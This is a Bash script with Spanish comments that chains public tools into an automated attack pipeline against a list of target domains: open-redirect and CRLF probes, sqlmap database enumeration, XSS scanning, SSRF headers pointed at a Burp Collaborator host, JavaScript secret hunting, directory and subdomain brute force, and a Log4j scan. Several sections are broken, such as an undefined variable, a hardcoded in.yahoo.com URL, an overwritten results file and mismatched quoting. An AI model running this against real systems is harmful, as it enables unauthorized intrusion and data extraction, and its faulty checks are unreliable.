#!/bin/bash

# Verifica si se proporciona un archivo "targets" como argumento
if [ $# -ne 1 ]; then
  echo "Uso: $0 <archivo_targets>"
  exit 1
fi

# Archivo de entrada con la lista de subdominios
targets_file="$1"

# Definir el servidor de Burp Collaborator
BURP_COLLABORATOR="your.burpcollaborator.server"

# Definir la ubicación de la lista de palabras para la fuerza bruta de subdominios
WORDLIST="/path/to/wordlist.txt"

# Archivos para guardar los resultados de cada comprobación
open_redirect_results="open_redirect_results.txt"
sql_injection_results="sql_injection_results.txt"
xss_results="xss_results.txt"
crlf_injection_results="crlf_injection_results.txt"
ssrf_results="ssrf_results.txt"
springboot_actuator_results="springboot_actuator_results.txt"
blind_xss_results="blind_xss_results.txt"
reflection_xss_results="reflection_xss_results.txt"
hidden_params_results="hidden_params_results.txt"
js_secrets_results="js_secrets_results.txt"
wayback_domains_results="wayback_domains_results.txt"
dir_bruteforce_results="dir_bruteforce_results.txt"
subdomain_bruteforce_results="subdomain_bruteforce_results.txt"
log4j_scan_results="log4j_scan_results.txt"

# Enumeración de subdominios utilizando gau y waybackurls
echo "[*] Enumerando subdominios con gau..."
gau -o "$wayback_domains_results" -t 50 -b png,jpg,gif,js,css,json,yml,xml,tar,zip,tgz,tbz,php,html,htm "$targets_file"

echo "[*] Enumerando subdominios con waybackurls..."
cat "$targets_file" | waybackurls >> "$wayback_domains_results"

# Filtrar y eliminar duplicados
sort -u "$wayback_domains_results" -o "$wayback_domains_results"

# Mostrar resultados
echo "[*] Subdominios enumerados:"
cat "$wayback_domains_results"

echo "[*] Total de subdominios encontrados: $(wc -l < "$wayback_domains_results")"

# Comprobación de Open Redirect
echo "[*] Comprobando Open Redirect..."
cat "$wayback_domains_results" | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' > "$open_redirect_results"

# Comprobación de SQL Injection
echo "[*] Comprobando SQL Injection..."
cat "$targets_file" | rush -j20 'if curl -Is "{}" | head -1 | grep -q "HTTP"; then echo "Running Sqlmap on '{}'"; sqlmap -u "{}" --batch --random-agent --dbs; fi' > "$sql_injection_results"

# Comprobación de XSS
echo "[*] Comprobando XSS..."
cat "$wayback_domains_results" | dalfox pipe --multicast -o "$xss_results"

# Comprobación de CRLF Injection
echo "[*] Comprobando CRLF Injection..."
cat "$wayback_domains_results" | rush -j40 'if curl -Iks -m 10 "{}/%0D%0Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} may be vulnerable to CRLF Injection. Check Manually";fi' > "$crlf_injection_results"

# Comprobación de SSRF
echo "[*] Comprobando SSRF..."
cat "$wayback_domains_results" | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting_IP: $BURP_COLLABORATOR" -H "From: root@$BURP_COLLABORATOR" -H "Client-IP: $BURP_COLLABORATOR" -H "X-Client-IP: $BURP_COLLABORATOR" -H "X-Forwarded-For: $BURP_COLLABORATOR" -H "X-Wap-Profile: http://$BURP_COLLABORATOR/wap.xml" -H "Forwarded: $BURP_COLLABORATOR" -H "True-Client-IP: $BURP_COLLABORATOR" -H "Contact: root@$BURP_COLLABORATOR" -H "X-Originating-IP: $BURP_COLLABORATOR" -H "X-Real-IP: $BURP_COLLABORATOR"; then echo "{}" | ts; fi' > "$ssrf_results"

# Comprobación de SpringBoot Actuator
echo "[*] Comprobando SpringBoot Actuator..."
cat "$wayback_domains_results" | rush -j40 'if curl -Iks -m 10 "$line" -H "CF-Connecting_IP: https://redirect.com" -H "From: root@https://redirect.com" -H "Client-IP: https://redirect.com" -H "X-Client-IP: https://redirect.com" -H "X-Forwarded-For: https://redirect.com" -H "X-Wap-Profile: https://redirect.com" -H "Forwarded: https://redirect.com" -H "True-Client-IP: https://redirect.com" -H "Contact: root@https://redirect.com" -H "X-Originating-IP: https://redirect.com" -H "X-Real-IP: https://redirect.com" | grep -q "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "$line" -H "CF-Connecting_IP: redirect.com" -H "From: root@redirect.com" -H "Client-IP: redirect.com" -H "X-Client-IP: redirect.com" -H "X-Forwarded-For: redirect.com" -H "X-Wap-Profile: redirect.com" -H "Forwarded: redirect.com" -H "True-Client-IP: redirect.com" -H "Contact: root@redirect.com" -H "X-Originating-IP: redirect.com" -H "X-Real-IP: redirect.com" | grep -q "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "The URL $line with vulnerable header may be vulnerable to Open Redirection. Check Manually";fi' > "$springboot_actuator_results"

# Comprobación de Blind XSS
echo "[*] Comprobando Blind XSS..."
cat "$wayback_domains_results" | rush -j40 'curl -sk "{}" -o /dev/null' > "$blind_xss_results"

# Comprobación de Reflexión XSS
echo "[*] Comprobando Reflexión XSS..."
cat "$wayback_domains_results" | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi' > "$reflection_xss_results"

# Comprobación de Parámetros Ocultos
echo "[*] Comprobando Parámetros Ocultos..."
cat "$wayback_domains_results" | rush 'curl -skL "{}" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL https://in.yahoo.com/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'' > "$hidden_params_results"

# Comprobación de Secretos en Archivos JavaScript
echo "[*] Comprobando Secretos en Archivos JavaScript..."
cat "$wayback_domains_results" | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew "$js_secrets_results"

# Comprobación de Dominios en Wayback Archive
echo "[*] Obteniendo Dominios de Wayback Archive..."
cat "$targets_file" | rush 'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{}/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sed 's/\.com.*/.com/' | sort -u' > "$wayback_domains_results"

# Fuerza Bruta de Directorios
echo "[*] Realizando Fuerza Bruta de Directorios..."
cat "$wayback_domains_results" | xargs -I@ sh -c 'ffuf -c -w "$WORDLIST" -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a "$dir_bruteforce_results"

# Fuerza Bruta de Subdominios
echo "[*] Realizando Fuerza Bruta de Subdominios..."
cat "$wayback_domains_results" | rush 'ffuf -u https://FUZZ.domain.com -w "$WORDLIST" -v | grep "| URL |" | awk '{print $4}' > "$subdomain_bruteforce_results"'

# Escaneo de Log4J
echo "[*] Escaneando Log4J..."
cat "$wayback_domains_results" | rush 'python3 /path/to/log4j-scan.py -u "@"' > "$log4j_scan_results"

# Mostrar resultados finales
echo "[*] Comprobaciones finalizadas. Resultados disponibles en los siguientes archivos:"
echo "- Open Redirect: $open_redirect_results"
echo "- SQL Injection: $sql_injection_results"
echo "- XSS: $xss_results"
echo "- CRLF Injection: $crlf_injection_results"
echo "- SSRF: $ssrf_results"
echo "- SpringBoot Actuator: $springboot_actuator_results"
echo "- Blind XSS: $blind_xss_results"
echo "- Reflexión XSS: $reflection_xss_results"
echo "- Parámetros Ocultos: $hidden_params_results"
echo "- Secretos en Archivos JavaScript: $js_secrets_results"
echo "- Dominios de Wayback Archive: $wayback_domains_results"
echo "- Fuerza Bruta de Directorios: $dir_bruteforce_results"
echo "- Fuerza Bruta de Subdominios: $subdomain_bruteforce_results"
echo "- Escaneo de Log4J: $log4j_scan_results"
